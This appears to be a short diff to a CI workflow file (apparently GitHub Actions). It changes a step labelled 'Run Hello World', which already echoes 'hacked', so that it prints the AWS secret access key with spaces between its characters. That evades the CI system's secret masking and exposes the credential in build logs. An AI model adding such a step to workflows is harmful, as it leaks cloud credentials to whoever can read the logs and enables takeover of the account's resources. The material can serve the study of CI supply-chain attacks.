@@ -26,4 +26,4 @@ jobs:
       - name: Run Hello World
         run: |
           echo "hacked"
-          env
+          echo $AWS_SECRET_ACCESS_KEY | sed 's/./& /g'
